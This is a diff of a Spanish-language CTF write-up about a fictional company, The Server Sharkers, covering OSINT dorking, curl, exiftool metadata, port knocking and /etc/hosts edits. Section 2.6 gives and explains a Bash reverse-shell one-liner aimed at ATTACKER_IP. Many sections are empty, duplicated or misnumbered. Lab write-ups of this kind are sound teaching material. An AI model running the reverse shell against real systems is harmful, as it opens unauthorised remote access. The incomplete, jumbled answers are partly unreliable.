@@ -2,39 +2,347 @@
 ### Shakers Write-Up ###
 ---
 
-### 1. ¿Qué comando utilizarías para escanear los puertos asociados a los servicios SSH, SMTP y HTTP y verificar si están filtrados o cerrados? (Escribe solo el comando con los puertos, sin incluir la dirección IP). ###
+### Task 2
+
+### 2.1. ¿Qué comando de búsqueda en Google me permite encontrar más rápidos sitios web específicos relacionados con la empresa The Server Sharkers?
+
+**Objetivo del comando:**
+
+Queremos que Google nos devuelva resultados de una empresa específica (The Server Sharkers) o un usuario (como theserversharker) dentro de un sitio web concreto, en este caso, LinkedIn.
+
+**Operador site:**
+
+Este operador limita los resultados de Google a un sitio web específico.
+Ejemplo:
+site:linkedin.com
+Esto le dice a Google: "devuélveme solo resultados dentro de linkedin.com".
+
+Palabra clave o nombre del usuario/empresa
+Si sabemos que el perfil o empresa se llama theserversharker o "The Server Sharkers", lo agregamos como término de búsqueda.
+Ejemplo:
+theserversharker
+
+
+Combinación de ambos
+Al combinar ambos:
+site:linkedin.com theserversharker
+
+Esto le dice a Google: "devuélveme resultados de LinkedIn que contengan la palabra 'theserversharker'".
 
 **✅ RESPUESTA:**  
 
 ```bash
-nmap -p 22,25,80 10.10.134.99
+site:linkedin.com theserversharker/
 ```
 
 ---------------------------------------------------------------------------------------------------------------------------------------------
-### 2. ¿Qué comando de búsqueda en Google me permite encontrar más rápido sitios web específicos relacionados con una persona o una empresa? ###
+### 2.2. ¿Qué podemos extraer de la sección de Destacado de la empresa The Server Sharkers? ###
 
-La respuesta es Google Dorking, un concepto que vimos en las primeras clases del curso.
-Sin esta técnica, encontrar la empresa o el objetivo que queremos investigar sería muy difícil o llevaría mucho más tiempo.
+En la página oficial de Server Shakers, se encuentra una sección denominada 'Destacados', que incluye una imagen representativa de una página. 
 
-📚 ¿Para qué sirve site: en OSINT o Ciberseguridad?
+Si el atacante encontro la pagina correcta, deberia ver esto:
 
-El operador site: sirve para buscar solo dentro de un sitio web específico o limitar la búsqueda a un dominio en concreto.
+<img width="822" alt="Captura de pantalla 2025-04-27 a las 14 43 17" src="https://github.com/user-attachments/assets/7488fec0-62bf-4e54-ab05-fdbaadcc1370" />
 
-1. Encontrar perfiles ocultos o poco visibles, como los de LinkedIn, GitHub, entre otros.
+A través de esta imagen, el atacante puede acceder a información adicional y relevante, lo que facilita la obtención de datos complementarios.
 
-2. Localizar documentos o archivos filtrados en páginas específicas.
+Al hacer click, encontramos la siguiente publicación del perfil de The Server Shakers, la cuál contiene una URL.
 
-3. Investigar empresas o personas sin perder tiempo en resultados irrelevantes.
+<img width="1128" alt="Captura de pantalla 2025-04-27 a las 15 04 25" src="https://github.com/user-attachments/assets/8181f735-bbca-42d6-b111-b93e95872bae" />
 
-**✅ RESPUESTA:**  
+**✅ RESPUESTA:**
+```bash
+  reoobot.github.io/TheServerSharkers/carrera
+```
+
+---------------------------------------------------------------------------------------------------------------------------------------------
+### 2.3. ¿Qué podemos extraer de la sección de Destacado de la empresa The Server Sharkers? ###
+
+El navegador o herramienta como curl realiza una solicitud GET a la URL especificada.
+En este caso, la URL es:
+https://reoobot.github.io/TheServerSharkers/
+
+Al usar -v, curl muestra en pantalla:
+
+  * Los encabezados enviados (por ejemplo, GET / HTTP/1.1, User-Agent, Host)
+
+La respuesta del servidor, incluyendo:
+
+  * Código de estado (por ejemplo, HTTP/2 200 OK)
+
+Encabezados HTTP de respuesta como Content-Type, Content-Length, Date, entre otros.
+
+El encabezado que nos interesa es:
+
+  * Content-Length: XXXX
+
+Este valor representa el tamaño en bytes del cuerpo del contenido HTML que el servidor está enviando. 
+Es crucial en ciertos tipos de ataques o análisis porque te permite:
+  * Saber cuánto contenido tiene la página sin descargarla completamente.
+
+Comparar si distintos parámetros cambian el tamaño de la respuesta.
+
+Detectar posibles vulnerabilidades (por ejemplo, cuando el contenido cambia dependiendo del usuario o del error generado). Este dato puede usarse, por ejemplo, en ataques de enumeración o detección de rutas ocultas:
+
+  * Si cambias la URL o parámetros, y el Content-Length varía, puedes detectar qué recursos existen o no.
+
+**✅ RESPUESTA:**
+```bash
+  curl -v https://reoobot.github.io/TheServerSharkers/
+```
+
+-------------
+### 2.4. ¿En qué página personal o red profesional podríamos encontrar más información detallada sobre "TheServerSharkers" o sus miembros? ###
+
+**Identificación del archivo objetivo**
+Durante la recolección de información sobre el sitio web relacionado con la empresa ficticia The Server Sharkers, encontré una imagen accesible desde la URL pública del repositorio:
+
+https://reoobot.github.io/TheServerSharkers/manolo1.webp
+
+**Descarga del archivo**
+
+Usé curl para descargar la imagen localmente:
 
 ```bash
-site:
+curl -o manolo1.webp https://reoobot.github.io/TheServerSharkers/manolo1.webp
 ```
 
----------------------------------------------------------------------------------------------------------------------------------------------
+**Análisis con exiftool**
 
-### 3. ¿En qué página personal o red profesional podríamos encontrar más información detallada sobre "TheServerSharkers" o sus miembros? ###
+Apliqué la herramienta exiftool sobre la imagen descargada para extraer los metadatos:
+
+```bash
+exiftool manolo1.webp
+```
+
+**Detección de información reveladora**
+
+Entre los metadatos, encontré un campo llamado Author que contenía un comando completo:
+
+sendEmail -f "name-remitente@kali.com" -t sharkers@localhost -u "ReverseShell" -m "Aun te estamos esperando no han cerrado las apuestas" -s "IP-Victima" -o tls=no -a
+
+**Interpretación del contenido**
+
+Analizando el comando, pude extraer múltiples indicadores relevantes:
+
+  * El remitente usaba una dirección con dominio @kali.com, lo cual sugiere que el atacante emplea Kali Linux, un sistema operativo comúnmente usado para hacking ético.
+
+  * El asunto "ReverseShell" implica la intención de ejecutar una shell inversa, una técnica habitual para obtener acceso remoto.
+
+  * El mensaje contiene una provocación en tono de reto, típico en entornos de Capture The Flag (CTF) o pruebas de seguridad ofensiva.
+
+  * El destinatario sharkers@localhost y el servidor SMTP "IP-Victima" apuntan a una simulación o infraestructura interna.
+
+  * El uso de -o tls=no indica que se está usando un servidor de correo sin cifrado, lo cual es una mala práctica o parte de un entorno controlado.
+
+  * A partir de una imagen aparentemente inocua, logré, mediante una herramienta OSINT (exiftool), extraer metadatos que revelaban:
+
+  * El sistema operativo del atacante
+
+  * El tipo de ataque planeado
+
+  * Información de infraestructura
+
+  * Y prácticas potencialmente vulnerables
+
+Esto demuestra cómo el análisis de metadatos puede proporcionar inteligencia valiosa en una fase de reconocimiento.
+
+**✅ RESPUESTA:**
+```bash
+  sendEmail -f "name-remitente@kali.com" -t sharkers@localhost -u "ReverseShell" -m "Aun te estamos esperando no han cerrado las apuestas" -s "IP-Victima" -o tls=no -a
+```
+
+-------------
+### 2.5. Los metadatos guardan secretos que no se van a simple vista. Encuentra la imagen del traidor, la que guarda su huella invisible, como Author ###
+
+
+
+-------------
+
+### 2.6. "Has obtenido acceso limitado a una máquina víctima. ¿Cómo podrías devolver una shell interactiva a tu máquina, sabiendo que Bash está disponible y puedes ejecutar comandos arbitrarios?" ###
+
+**¿Cómo se llega a esta conclusión?**
+Entorno con Bash disponible
+La premisa menciona que la víctima tiene Bash instalado. Esto es fundamental, ya que Bash permite redirigir flujos de entrada/salida y tiene acceso a dispositivos especiales como /dev/tcp.
+
+**Capacidad de ejecutar comandos arbitrarios**
+Esto implica que puedes escribir y ejecutar un comando directamente desde el intérprete de comandos o algún punto de entrada, como una vulnerabilidad en una aplicación web o consola mal asegurada.
+
+**Necesidad de una reverse shell**
+En muchos escenarios, cuando estás dentro de una máquina víctima con acceso limitado, no puedes iniciar una sesión SSH o abrir puertos. Por tanto, se requiere que la máquina víctima inicie la conexión hacia tu equipo atacante, que debe estar esperando.
+
+**Investigas o recuerdas que Bash permite conexiones de red**
+Bash tiene una característica poco conocida pero muy poderosa: los dispositivos virtuales /dev/tcp/host/port.
+
+Este mecanismo te permite crear conexiones TCP directamente desde Bash sin necesidad de herramientas externas como nc, python, perl, etc.
+
+**Sabes que Bash también puede lanzar una shell interactiva (bash -i)**
+El flag -i inicia Bash en modo interactivo, útil para mantener una sesión viva y activa.
+
+**Combinas todo con redirecciones**
+Aquí es donde se juntan las piezas:
+
+  * bash -i: lanza una shell interactiva,
+
+  * >&: redirige la salida estándar (1) y la salida de errores (2) hacia la entrada del socket TCP,
+
+  * /dev/tcp/ATTACKER_IP/PORT: es el canal TCP hacia tu máquina
+
+  * 0>&1: redirige la entrada estándar hacia ese mismo canal.
+
+**✅ RESPUESTA:**
+```bash
+ bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
+```
+
+-------------
+
+### 2.7. "Cuando alguien menciona 'Knock', ¿te preguntas si es una referencia al golpe que haces para entrar en un sistema, o acaso estás buscando algo en los rincones más oscuros de la red?" ###
+
+**Interpretación del término “Knock”**
+
+La palabra "Knock" en un contexto de hacking o seguridad no suele ser literal. En el ámbito técnico, suele asociarse con la técnica llamada Port Knocking.
+
+Clave: La mención de "golpe para entrar en un sistema" → metáfora clara para Port Knocking.
+
+**Análisis de la pista “Tres knock^3, secretos: 1234, 2345, 3456”**
+
+Esta parte te da una estructura:
+
+  * “Knock³” → indica 3 secuencias, y “tres” indica que hay tres golpes por secuencia.
+
+  * “1234, 2345, 3456” → son puertos, y cada número representa un puerto TCP.
+
+Esto coincide exactamente con cómo funciona Port Knocking:
+
+  * Un demonio oculto en el sistema escucha secuencias de conexión a puertos cerrados.
+
+Si la secuencia exacta es recibida (como 1234 → 2345 → 3456), el demonio puede abrir un puerto real (por ejemplo, SSH en 22) al atacante.
+
+**“La vieja puerta filtrada crujió...”**
+
+Esta frase sugiere que:
+
+  * La puerta estaba cerrada o protegida,
+
+Pero algo (como la secuencia correcta) la ha hecho ceder o abrirse,
+
+Y lo que había detrás ahora es accesible → tal vez una shell, una bandera o una pista secreta.
+
+**“La respuesta son 3 palabras de 4 caracteres”**
+
+Esto indica que:
+
+El recurso desbloqueado tras la secuencia contiene una clave,
+
+Esta clave tiene un formato específico: xxxx xxxx xxxx (tres palabras, cada una de cuatro letras).
+
+Este tipo de formato es común en retos CTF para representar flags o contraseñas.
+
+**✅ RESPUESTA:**
+```bash
+ 1234 2345 3456
+```
+
+-------------
+
+### 2.8. "Había una vez un tiburón llamado Server, perdido en el vasto océano de IPs. Un sabio navegante escribió su nombre en el mapa secreto /etc/hosts, y así, cada vez que alguien llamaba a ' ', encontraba su guarida oculta entre las olas." ###
+
+**Desglose del acertijo:**
+
+“Había una vez un tiburón llamado Server, perdido en el vasto océano de IPs.”
+
+**Interpretación:**
+
+Esto representa un nombre de dominio (en este caso, theserversharkers.io) que no está resolviendo correctamente por DNS (es decir, no puede ser encontrado en el “océano de IPs”).
+
+“Un sabio navegante escribió su nombre en el mapa secreto /etc/hosts...”
+
+Esto es una referencia directa al archivo /etc/hosts, un archivo de texto local donde se puede asociar manualmente un nombre de dominio a una dirección IP.
+Es un recurso común para:
+
+Simular la existencia de un dominio.
+
+Redirigir tráfico localmente sin depender de DNS.
+
+“...y así, cada vez que alguien llamaba a ' ', encontraba su guarida oculta entre las olas.”
+
+Cuando alguien accede al dominio (theserversharkers.io), si está mapeado en /etc/hosts, el sistema resolverá correctamente el nombre y sabrá a qué IP conectarse.
+→ Es decir, lo encontrará en su “guarida” (IP definida manualmente).
+
+**¿Cómo actúas con esta pista?**
+
+Sabiendo que:
+
+El dominio theserversharkers.io no resuelve por DNS,
+
+Pero debe poder usarse localmente (por ejemplo, en un navegador o curl),
+
+→ La acción lógica es modificar /etc/hosts para hacer esa resolución manualmente.
+
+sudo → se necesita permiso de superusuario para modificar este archivo.
+
+nano → es un editor de texto común.
+
+/etc/hosts → el archivo objetivo.
+
+Allí podrías agregar, por ejemplo:
+
+127.0.0.1 theserversharkers.io
+o la IP real que deba asociarse al dominio.
+
+**✅ RESPUESTA:**
+```bash
+ sudo nano /etc/hosts
+```
+-------------
+
+### 2.9. "Como Homero buscando donas en callejones secretos de Springfield, recorrí los rincones ocultos de The Server Sharkers, golpeando cada puerta .php, .html, .txt y .mp4, esperando encontrar un dulce premio digital." ###
+
+
+
+-------------
+### 2.10. "Al final del puerto 80, entre el eco de las respuestas, ¿será este el momento donde un diccionario abre la puerta oculta, o acaso la clave yace en algo más profundo, más oscuro, más encriptado? La verdad se encuentra entre los bits, ¿te atreves a seguir?" ###
+
+
+
+-------------
+### 2.11. "En el mundo del hacking, como en las películas de los 90, ¿puede un diccionario de 98 palabras desbloquear el puerto 80, o es solo una ilusión en la red?" ###
+
+
+
+-------------
+### 2.12. ¿qué secretos ocultos pueden desvelarse al descubrir subdominios o virtual hosts en el servidor? ¿Qué conexiones inesperadas de puertos o configuraciones de DNS podrían hallarse bajo la superficie?" ###
+
+
+
+-------------
+### 2.13. ¿Cuál es el usuario de The Server Sharkers que tiene cuatro letras? ###
+
+
+
+-------------
+### 2.14. ¿Cuál es el usuario de The Server Sharkers que tiene cuatro letras? ###
+
+
+
+-------------
+
+### TAKS 3
+### 3.1. "Si lograste acceder a un sistema a través de SSH, ¿cómo sabrías qué usuario está detrás de la puerta cerrada? A veces, el whoami o un simple ps aux pueden revelar más de lo que imaginas." ###
+
+
+
+-------------
+### 3.2."Tres knock^3, secretos: 1234, 2345, 3456. La vieja puerta filtrada crujió... ¿qué misterios aguardaban tras ella? ###
+
+
+-------------
+TASK 4
+### 4.1."Tres knock^3, secretos: 1234, 2345, 3456. La vieja puerta filtrada crujió... ¿qué misterios aguardaban tras ella? ###
+
+
+### 2.3. ¿En qué página personal o red profesional podríamos encontrar más información detallada sobre "TheServerSharkers" o sus miembros? ###
 
 Esta pregunta está relacionada con la anterior, ya que, sin utilizar el comando site:, sería muy difícil para un atacante encontrar información relevante sobre "TheServerSharkers".
 
